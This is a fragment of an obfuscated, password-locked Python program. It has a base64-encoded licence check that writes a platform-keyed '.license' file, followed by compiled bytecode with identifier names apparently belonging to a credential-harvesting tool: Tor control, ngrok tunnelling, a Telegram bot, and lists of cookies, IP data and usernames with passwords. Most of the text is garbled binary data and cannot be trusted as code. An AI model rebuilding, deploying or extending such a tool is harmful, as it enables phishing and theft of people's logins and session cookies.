QoKSA9PSAnMWY4MWE2ZTc1NGRmZDI5OGZhMGJlN2VhMTI1ZWYzNDAnOgoJCQkJCXIgPSBvcGVuKCIubGljZW5zZSIsJ3cnKQoJCQkJCWJlbiA9ICJhZGE0ZjYxNGNjMjI2ZmUzZjk1YjhlZjM0NjkzNGIxNjNhZTZiNjFjMTczY2E3NjgzMjlmNDhiODQxOWI5YjBjNDg2NjRhYzk4ZTZkZDg2N2Y3ZmRmN2Q3NjVkMzA5NTZkM2Y5OWI1YzM5NmFhMjkyOGYxMjI1NDQ2YTUyNTZiZlxuMDMwMzExZjgxMTExMjUwODU4YTc5MGYxNzVmYjc4MmZhNTlhYTI3N2RkN2Q4ZTEyM2RkYmM1MzU5MGU0MzcxYzU2OGQzOGJjYWI2MDIxNDUxYjJmYjZjNWViNjQ1YWU3MjAwYTE2NjEyMzIxNjBkMTkyMDY2ZGQyZTM1MjJmMmZcbiVzXG43NDgxOTNkNzA5ZjRkMjMzMmRlYWM0MjQzNWZiZWQ1OWIzNWQ3ZTdmNmM5MjU2ZDk4YjJlMGU3YzY4NzEyMDM2MWZlMzRmYTdkNDY2YmUyYjc3YjZhZjdiYmE0YzFjMmJlNWY0OGZkN2M0YjZhMDFjNWZlYTZhYWIzMDFlYzhmMCIlKGhhc2hsaWIuYmxha2UycyhzdHIocGxhdGZvcm0ucGxhdGZvcm0oKSkuZW5jb2RlKCd1dGYtOCcpKS5oZXhkaWdlc3QoKSkKCQkJCQlyLndyaXRlKGJlbikKCQkJCQlyLmNsb3NlKCkKCQkJCQlwcmludCgiIFRoZSBwYXNzd29yZCBpcyBjb3JyZWN0IikKCQkJCQlwcmludCgiIFRoZSBzY3JpcHQgd2lsbCBydW4gaW4gZml2ZSBzZWNvbmRzLi4uIikKCQkJCQl0aW1lLnNsZWVwKDUpCgkJCQkJbWFpbigpCgkJCQllbHNlOgoJCQkJCXN5cy5leGl0KCJcbiBUaGUgcGFzc3dvcmQgaXMgaW5jb3JyZWN0XG4gUGxlYXNlIGNoZWNrIHlvdXIgcGFzc3dvcmRcbiIpCgkJZWxzZToKCQkJcHJpbnQoIiBQbGVhc2UgZW50ZXIgdGhlIGZpbGUgcGFzc3dvcmQiKQoJCQlwYXNzd29yZF9zY3JpcHQgPSBnZXRwYXNzLmdldHBhc3MoInBhc3N3b3JkOiAiKQoJCQlpZiBoYXNobGliLm1kNShoYXNobGliLnNoYTUxMihwYXNzd29yZF9zY3JpcHQuZW5jb2RlKCd1dGYtOCcpKS5oZXhkaWdlc3QoKS5lbmNvZGUoJ3V0Zi04JykpLmhleGRpZ2VzdCgpID09ICcxZjgxYTZlNzU0ZGZkMjk4ZmEwYmU3ZWExMjVlZjM0MCc6CgkJCQlyID0gb3BlbigiLmxpY2Vuc2UiLCd3JykKCQkJCWJlbiA9ICJhZGE0ZjYxNGNjMjI2ZmUzZjk1YjhlZjM0NjkzNGIxNjNhZTZiNjFjMTczY2E3NjgzMjlmNDhiODQxOWI5YjBjNDg2NjRhYzk4ZTZkZDg2N2Y3ZmRmN2Q3NjVkMzA5NTZkM2Y5OWI1YzM5NmFhMjkyOGYxMjI1NDQ2YTUyNTZiZlxuMDMwMzExZjgxMTExMjUwODU4YTc5MGYxNzVmYjc4MmZhNTlhYTI3N2RkN2Q4ZTEyM2RkYmM1MzU5MGU0MzcxYzU2OGQzOGJjYWI2MDIxNDUxYjJmYjZjNWViNjQ1YWU3MjAwYTE2NjEyMzIxNjBkMTkyMDY2ZGQyZTM1MjJmMmZcbiVzXG43NDgxOTNkNzA5ZjRkMjMzMmRlYWM0MjQzNWZiZWQ1OWIzNWQ3ZTdmNmM5MjU2ZDk4YjJlMGU3YzY4NzEyMDM2MWZlMzRmYTdkNDY2YmUyYjc3YjZhZjdiYmE0YzFjMmJlNWY0OGZkN2M0YjZhMDFjNWZlYTZhYWIzMDFlYzhmMCIlKGhhc2hsaWIuYmxha2UycyhzdHIocGxhdGZvcm0ucGxhdGZvcm0oKSkuZW5jb2RlKCd1dGYtOCcpKS5oZXhkaWdlc3QoKSkKCQkJCXIud3JpdGUoYmVuKQoJCQkJci5jbG9zZSgpCgkJCQlwcmludCgiIFRoZSBwYXNzd29yZCBpcyBjb3JyZWN0IikKCQkJCXByaW50KCIgVGhlIHNjcmlwdCB3aWxsIHJ1biBpbiBmaXZlIHNlY29uZHMuLi4iKQoJCQkJdGltZS5zbGVlcCg1KQoJCQkJbWFpbigpCgkJCWVsc2U6CgkJCQlzeXMuZXhpdCgiXG4gVGhlIHBhc3N3b3JkIGlzIGluY29ycmVjdFxuIFBsZWFzZSBjaGVjayB5b3VyIHBhc3N3b3JkXG4iKQ==rI  )hr	   r   r
  r   r.   r�   Zgetpassr  r  r   rN   r\   r�   r<  r�   r�   rf   r  Zurllib.requestr  Zstem.processr?  r   Zstem.controlr   Zpyngrokr   r   r   Z_nnnnr�   r�   r�   r  r�   ZreqcountZhasendedr�   r  Z	passwd_okr  r  r  r1  r4  Zcookies_listro   Znow_dirZip_dataZuser_pass_datar�   r�   r�   r�   Ztelegram_botrn   r9  r'   r�   �loadrW   r)   r+   r@   rB   rH   rI   rT   r[   ra   rr   rw   r�   r�   ru   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r0  r2  r3  r   r=  rA  rD  rK  r!  rC  r�   �base64r@  Z	b64decoderD   r   rF   r   r   r   r
   �<module>   s�   
y"

'kk'
S;, 
